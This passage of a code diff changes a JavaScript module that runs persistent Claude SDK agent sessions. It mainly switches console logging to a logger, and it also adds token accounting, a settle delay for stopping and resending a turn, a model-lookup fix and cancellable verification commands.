     failActiveTurn(runtime, error);
     if (!runtime.disposed) {
       // 带上 CLI 的 stderr —— 子进程起不来时,退出码本身说明不了任何问题。
-      console.error(
+      log.error(
         `[Claude SDK] Persistent runtime ${runtime.key} failed:`,
         runtime.stderrTail ? runtime.stderrTail.describe(error) : (error?.message || error),
       );
@@ -2061,7 +2496,7 @@ function clearTurnTimers(turn) {
 function fireTurnTimeout(runtime, turn, messageText) {
   const timeoutError = new Error(messageText);
   timeoutError.prismTurnTimeout = true;
-  console.error(`[Claude SDK] Turn watchdog fired for runtime ${runtime.key}: ${timeoutError.message}`);
+  log.error(`[Claude SDK] Turn watchdog fired for runtime ${runtime.key}: ${timeoutError.message}`);
   failActiveTurn(runtime, timeoutError);
   try {
     runtime.abortController?.abort();
@@ -2135,7 +2570,7 @@ function failActiveTurn(runtime, error) {
   cancelPendingApprovalsForSession(runtime.appSessionId, 'cancelled');
   if (runtime.pendingToolUses.size > 0 && !runtime.suspect) {
     runtime.suspect = true;
-    console.warn(
+    log.warn(
       `[Claude SDK] Runtime ${runtime.key} marked suspect: turn ended with `
       + `${runtime.pendingToolUses.size} tool call(s) still in flight (${error?.message || 'unknown reason'})`
     );
@@ -2170,7 +2605,7 @@ async function disposePersistentRuntime(runtime) {
     if (typeof runtime.query?.close === 'function') runtime.query.close();
     else runtime.abortController?.abort();
   } catch (error) {
-    console.warn(`[Claude SDK] Runtime close failed:`, error?.message || error);
+    log.warn(`[Claude SDK] Runtime close failed:`, error?.message || error);
   }
   if (claudeRuntimes.get(runtime.key) === runtime) claudeRuntimes.delete(runtime.key);
 }
@@ -2200,18 +2635,18 @@ async function abortClaudeSDKRun(runId) {
 
   try {
     if (runtime && !runtime.disposed && runtime.turn) {
-      console.log(`[Claude SDK] Aborting run ${runId} via runtime interrupt`);
+      log.info(`[Claude SDK] Aborting run ${runId} via runtime interrupt`);
       await interruptWithTimeout(runtime.query, `run ${runId} (runtime)`);
       return true;
     }
     if (entry.queryInstance) {
-      console.log(`[Claude SDK] Aborting run ${runId} via one-shot interrupt`);
+      log.info(`[Claude SDK] Aborting run ${runId} via one-shot interrupt`);
       await interruptWithTimeout(entry.queryInstance, `run ${runId} (one-shot)`);
       return true;
     }
   } catch (error) {
     // interrupt 协商失败或超时(子进程僵死):升级为硬撕。
-    console.error(`[Claude SDK] Abort by runId ${runId} failed, escalating:`, error?.message || error);
+    log.error(`[Claude SDK] Abort by runId ${runId} failed, escalating:`, error?.message || error);
     if (runtime && !runtime.disposed) {
       try {
         runtime.abortController?.abort();
@@ -2358,6 +2793,9 @@ async function createPersistentRuntime(key, options, settings) {
     // F6:这个常驻进程算在谁头上 —— 名额满了要按人**公平**淘汰,而不是一律
     // 全局 LRU(全局 LRU 下一个人开二十个会话就能把池子占满,其余人每轮重建)。
     ownerUserId: typeof options.ownerUserId === 'number' ? options.ownerUserId : null,
+    // fg:记账要用。两个都对一段对话稳定,所以跟着 runtime 走而不是每轮传。
+    projectPath: typeof options.cwd === 'string' && options.cwd ? options.cwd : null,
+    actorUsername: typeof options.actorUsername === 'string' ? options.actorUsername : null,
   };
 
   const sdkOptions = buildPersistentSdkOptions(options, runtime);
@@ -2415,7 +2853,35 @@ async function runtimeForSend(options) {
     }
 
     if (runtime && runtime.turn) {
-      throw new Error('A turn is already running for this session');
+      /**
+       * fj:先给收尾一点时间,别立刻抛。
+       *
+       * `query.interrupt()` 返回只代表**子进程收到了中断请求**,不代表回合已经
+       * 收尾 —— 真正结束是稍后流上那条 `result` 帧到达时由 `finishPersistentTurn`
+       * 把 `runtime.turn` 置 null。而网关在 interrupt 返回的那一刻就把 run 标成
+       * completed、解锁了输入框。
+       *
+       * 于是「按停止 → 改一句话 → 重发」(引导 agent 最常用的操作)会撞进这段
+       * 窗口:用户看到一句裸英文 `A turn is already running for this session`,
+       * 消息没发出去要重打。更麻烦的是 `kind:'error'` 在显示日志的白名单里,
+       * 这条报错会**永久留在这段对话的历史里**,刷新之后还在。
+       *
+       * 等一下就好:正常的「停止后重发」会自然排在后面,只有真正的并发双发
+       * (两个标签页同时按回车)才会走到抛错。
+       */
+      const settling = runtime.turn.promise;
+      if (settling && typeof settling.then === 'function') {
+        await Promise.race([
+          settling.catch(() => {}),
+          new Promise((resolve) => {
+            const timer = setTimeout(resolve, TURN_SETTLE_GRACE_MS);
+            if (typeof timer.unref === 'function') timer.unref();
+          }),
+        ]);
+      }
+      if (runtime.turn) {
+        throw new Error('A turn is already running for this session');
+      }
     }
 
     // 没有回合 ≠ CLI 闲着。上一回合若是被中止/看门狗收掉的,它起的工具可能还在跑,
@@ -2423,7 +2889,7 @@ async function runtimeForSend(options) {
     // 换一个干净的 CLI(resume 同一段对话),代价是一次 resume,换来的是
     // "发出去的消息一定会被处理"。
     if (runtime && runtime.pendingToolUses.size > 0) {
-      console.warn(
+      log.warn(
         `[Claude SDK] Runtime ${runtime.key} still has ${runtime.pendingToolUses.size} tool call(s) in flight `
         + `after its turn ended${runtime.suspect ? ' (marked suspect)' : ''}; rebuilding instead of reusing it`
       );
@@ -2464,6 +2930,9 @@ async function runtimeForSend(options) {
       if (typeof options.ownerUserId === 'number') {
         runtime.ownerUserId = options.ownerUserId;
       }
+      if (typeof options.actorUsername === 'string' && options.actorUsername) {
+        runtime.actorUsername = options.actorUsername;
+      }
 
       if (runtime.currentPermissionMode !== settings.permissionMode) {
         if (typeof runtime.query?.setPermissionMode === 'function') {
@@ -2474,7 +2943,7 @@ async function runtimeForSend(options) {
             );
             runtime.currentPermissionMode = settings.permissionMode;
           } catch (error) {
-            console.warn('[Claude SDK] setPermissionMode failed, rebuilding runtime:', error?.message);
+            log.warn('[Claude SDK] setPermissionMode failed, rebuilding runtime:', error?.message);
             const resumeSessionId = runtime.sessionId || requestedSessionId;
             await disposePersistentRuntime(runtime);
             return createPersistentRuntime(key, { ...options, resumeSessionId }, settings);
@@ -2493,7 +2962,7 @@ async function runtimeForSend(options) {
             await withRuntimeControlTimeout(runtime.query.setModel(targetModel), 'setModel');
             runtime.currentModel = targetModel;
           } catch (error) {
-            console.warn('[Claude SDK] setModel failed, rebuilding runtime:', error?.message);
+            log.warn('[Claude SDK] setModel failed, rebuilding runtime:', error?.message);
             const resumeSessionId = runtime.sessionId || requestedSessionId;
             await disposePersistentRuntime(runtime);
             return createPersistentRuntime(key, { ...options, resumeSessionId }, settings);
@@ -2552,6 +3021,8 @@ async function runPersistentTurn(runtime, { command, images, cwd, ws, sessionSum
     // 输入递交之后 CLI 可能已把用户消息写进 transcript,盲目重放=重复消息。
     startedAtMs: Date.now(),
     inputDelivered: false,
+    /** fg:这一回合的 token 累加器。见 createUsageAccumulator。 */
+    usage: createUsageAccumulator(),
     // 这一回合用哪套预算。维护回合(自动压缩)走短预算,和用户回合分开 ——
     // 用户回合里跑一小时的 SQL 正常,压缩跑一小时是卡死了。
     watchdog: internal ? MAINTENANCE_WATCHDOG : TURN_WATCHDOG,
@@ -2625,7 +3096,7 @@ async function readRuntimeContextUsage(runtime) {
     runtime.lastContextUsage = normalized;
     return normalized;
   } catch (error) {
-    console.warn('[Claude SDK] getContextUsage failed:', error?.message || error);
+    log.warn('[Claude SDK] getContextUsage failed:', error?.message || error);
     return null;
   }
 }
@@ -2649,7 +3120,7 @@ function sendContextUsageEvent(ws, sessionId, usage, runtime = null) {
       // 越过它是正常且预期的状态,所以百分比会出现 ≥100%。把阈值一起送过去,
       // 界面才能把"过线"说成过线,而不是渲染成一个荒谬的数字。
       autoCompactRatio: AUTO_COMPACT_RATIO,
-      // 过线了、但 CLI 还在跑工具,压缩被推迟。此前这条路径**只有 console.warn**,
+      // 过线了、但 CLI 还在跑工具,压缩被推迟。此前这条路径**只有一行 warn**,
       // 用户看到的是"过了 80% 却什么都不发生"。
       compactionDeferred: Boolean(runtime?.compactionDeferred) || undefined,
     },
@@ -2678,7 +3149,7 @@ function scheduleContextUsageBackfill(runtime, ws) {
       sendContextUsageEvent(ws, runtime.sessionId, usage, runtime);
     }
   })().catch((error) => {
-    console.warn('[Claude SDK] Context usage backfill failed:', error?.message || error);
+    log.warn('[Claude SDK] Context usage backfill failed:', error?.message || error);
   });
 }
 
@@ -2689,7 +3160,17 @@ function scheduleContextUsageBackfill(runtime, ws) {
 async function queryClaudeSDKPersistent(command, options = {}, ws, runEntry = null) {
   const { sessionId, sessionSummary } = options;
 
-  const resolvedModel = await providerModelsService.resolveResumeModel('claude', sessionId, options.model);
+  /**
+   * fj:按 **app 会话 id** 查"下一轮用哪个模型"。
+   *
+   * `/models` 的写入走 `POST /:provider/sessions/:sessionId/active-model`,
+   * 而那条路由的 `sessionId` 是前端给的 **app 会话 id**;这里读的却是
+   * `options.sessionId` —— 网关填的是 `session.provider_session_id`。
+   * 网页会话两个 id 必然不同,于是**用户在 /models 里换的模型下一轮根本不生效**,
+   * 而界面上 `getCurrentActiveModel` 又会把待生效的那个报出来,看着像生效了。
+   */
+  const modelLookupSessionId = (typeof options.runId === 'string' && options.runId) || sessionId;
+  const resolvedModel = await providerModelsService.resolveResumeModel('claude', modelLookupSessionId, options.model);
   let effortModels = CLAUDE_FALLBACK_MODELS;
   try {
     effortModels = (await providerModelsService.getProviderModels('claude')).models;
@@ -2748,7 +3229,7 @@ async function queryClaudeSDKPersistent(command, options = {}, ws, runEntry = nu
 
   if (AUTO_COMPACT_ENABLED && !shouldAutoCompact && !runtimeIsIdle(runtime)
       && runtime.lastContextUsage && runtime.lastContextUsage.ratio >= AUTO_COMPACT_RATIO) {
-    console.warn(`[Claude SDK] Skipping pre-send compaction for ${runtime.key}: the CLI is not idle`);
+    log.warn(`[Claude SDK] Skipping pre-send compaction for ${runtime.key}: the CLI is not idle`);
   }
 
   if (shouldAutoCompact) {
@@ -2781,7 +3262,7 @@ async function queryClaudeSDKPersistent(command, options = {}, ws, runEntry = nu
         // 通过 sendContextUsageEvent 更新到那个环上了。
       }
     } catch (error) {
-      console.warn('[Claude SDK] Auto-compact failed, continuing with the user turn:', error?.message || error);
+      log.warn('[Claude SDK] Auto-compact failed, continuing with the user turn:', error?.message || error);
     }
     // A user abort that landed DURING the internal /compact turn cancels the
     // whole run — never silently proceed to the real turn.
@@ -2874,7 +3355,7 @@ async function runMaintenanceCompaction(runtime, { ws, sessionId, sessionSummary
   const ratio = runtime.lastContextUsage?.ratio;
   if (typeof ratio !== 'number' || ratio < AUTO_COMPACT_RATIO) return false;
   if (!runtimeIsIdle(runtime)) {
-    console.warn(`[Claude SDK] Skipping maintenance compaction for ${runtime.key}: the CLI is not idle`);
+    log.warn(`[Claude SDK] Skipping maintenance compaction for ${runtime.key}: the CLI is not idle`);
     // 记下来,让用量芯片能说出"已过线,等 CLI 空闲后压缩" —— 沉默地跳过,
     // 就是用户看到占比一路往上爬却毫无解释的原因。
     runtime.compactionDeferred = { ratio, since: Date.now(), reason: 'cli-busy' };
@@ -2909,7 +3390,7 @@ async function runMaintenanceCompaction(runtime, { ws, sessionId, sessionSummary
   } catch (error) {
     // 压缩失败/超时都不该影响用户 —— 这一回合的答复早就送出去了。
     // 下一回合带着未压缩的上下文继续跑,顶多是发送前那道兜底再试一次。
-    console.warn(`[Claude SDK] Maintenance compaction failed for ${runtime.key}:`, error?.message || error);
+    log.warn(`[Claude SDK] Maintenance compaction failed for ${runtime.key}:`, error?.message || error);
     return false;
   }
 }
@@ -3002,8 +3483,19 @@ async function runAgentLoop(loopSpec, options = {}, ws, runEntry = null) {
     if (!testCommand) break;
 
     sendStatus(`Loop ${round}/${effectiveRounds} · 运行验证：${testCommand}`);
-    const test = await runTestCommand(options.cwd, testCommand);
+    /**
+     * fj:验证命令挂上本轮的中止信号(见 runTestCommand)—— 按停止就真的停。
+     */
+    const test = await runTestCommand(options.cwd, testCommand, {
+      signal: runtime?.abortController?.signal,
+    });
     lastTestOutput = test.output || '(无输出)';
+
+    // fj:被叫停就当场收尾,不再进下一轮。
+    if (test.cancelled) {
+      aborted = true;
+      break;
+    }
 
     if (test.ok) {
       passed = true;
@@ -3221,7 +3713,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
         }
       }
     } catch (error) {
-      console.warn('[Claude SDK] Checkpoint creation failed:', error?.message || error);
+      log.warn('[Claude SDK] Checkpoint creation failed:', error?.message || error);
     }
   }
 
@@ -3232,7 +3724,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
       turnOutcome = await runAgentLoop(loopSpec, options, ws, runEntry);
     } catch (error) {
       const message = error?.message || String(error);
-      console.error('[Claude SDK] Agent loop failed:', message);
+      log.error('[Claude SDK] Agent loop failed:', message);
       ws.send(createNormalizedMessage({ kind: 'error', content: `Agent Loop 失败: ${message}`, sessionId: options.sessionId || null, provider: 'claude' }));
       ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
     }
@@ -3251,7 +3743,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
       if (runEntry?.aborted) {
         // chat.abort already completed the run; the teardown throw is noise.
         // Never replay an aborted turn through the one-shot fallback.
-        console.log('[Claude SDK] Persistent turn ended by abort:', message);
+        log.info('[Claude SDK] Persistent turn ended by abort:', message);
         // Consume the abort flag so it cannot bleed into the session's next run.
         if (options.sessionId) abortedSessionIds.delete(options.sessionId);
         if (runEntry.runtime?.sessionId) abortedSessionIds.delete(runEntry.runtime.sessionId);
@@ -3268,7 +3760,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
       } else if (error?.prismStreamed || error?.prismTurnTimeout) {
         // Partial output already reached the client (or the watchdog killed
         // the turn after a long run) — do NOT replay the turn.
-        console.error('[Claude SDK] Persistent turn failed mid-stream:', displayMessage);
+        log.error('[Claude SDK] Persistent turn failed mid-stream:', displayMessage);
         ws.send(createNormalizedMessage({ kind: 'error', content: displayMessage, sessionId: options.sessionId || null, provider: 'claude' }));
         ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
         notifyRunFailed({
@@ -3281,7 +3773,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
       } else if (error?.prismRuntimeLimit) {
         // Resident pool full of busy runtimes: degrade WITHIN the overflow
         // budget (with a visible notice) or fail fast when it is exhausted.
-        console.warn('[Claude SDK] Runtime pool full, attempting budgeted one-shot fallback:', message);
+        log.warn('[Claude SDK] Runtime pool full, attempting budgeted one-shot fallback:', message);
         await runOneShotFallback(command, options, ws, runEntry, true);
       } else if (
         error?.prismInputDelivered
@@ -3296,11 +3788,11 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
       ) {
         // 输入已递交且 transcript 侦察显示消息可能已落盘:重放会造出重复的
         // 用户消息。老实报错让用户重发,比悄悄污染 transcript 好。
-        console.warn('[Claude SDK] Persistent turn failed after input delivery; transcript may hold the message — not replaying:', message);
+        log.warn('[Claude SDK] Persistent turn failed after input delivery; transcript may hold the message — not replaying:', message);
         ws.send(createNormalizedMessage({ kind: 'error', content: `${displayMessage}\n\n(回合在消息递交后失败,为避免重复消息未自动重试,请重新发送)`, sessionId: options.sessionId || null, provider: 'claude' }));
         ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
       } else {
-        console.warn('[Claude SDK] Persistent turn failed, falling back to one-shot mode:', message);
+        log.warn('[Claude SDK] Persistent turn failed, falling back to one-shot mode:', message);
         await runOneShotFallback(command, options, ws, runEntry, false);
       }
     }
@@ -3338,7 +3830,7 @@ async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
         }));
       }
     } catch (error) {
-      console.warn('[Claude SDK] Changed-files summary failed:', error?.message || error);
+      log.warn('[Claude SDK] Changed-files summary failed:', error?.message || error);
     }
 
     pruneCounter += 1;
@@ -3422,7 +3914,7 @@ async function getClaudeSlashCommands(sessionId) {
       .filter((entry) => entry.name.length > 1);
     return runtime.slashCommands;
   } catch (error) {
-    console.warn('[Claude SDK] supportedCommands failed:', error?.message || error);
+    log.warn('[Claude SDK] supportedCommands failed:', error?.message || error);
     return null;
   }
 }
@@ -3472,7 +3964,7 @@ async function releaseClaudeSession(sessionId) {
     await disposePersistentRuntime(runtime);
     return { released: true, reason: 'disposed' };
   } catch (error) {
-    console.warn('[Claude SDK] Release failed:', error?.message || error);
+    log.warn('[Claude SDK] Release failed:', error?.message || error);
     return { released: false, reason: 'error' };
   }
 }
@@ -3498,7 +3990,7 @@ async function prewarmClaudeSession(options = {}) {
     await runtimeForSend({ ...options, model, resolvedEffort });
     return { warmed: true, reason: 'created' };
   } catch (error) {
-    console.warn('[Claude SDK] Pre-warm skipped:', error?.message || error);
+    log.warn('[Claude SDK] Pre-warm skipped:', error?.message || error);
     return { warmed: false, reason: 'error' };
   }
 }
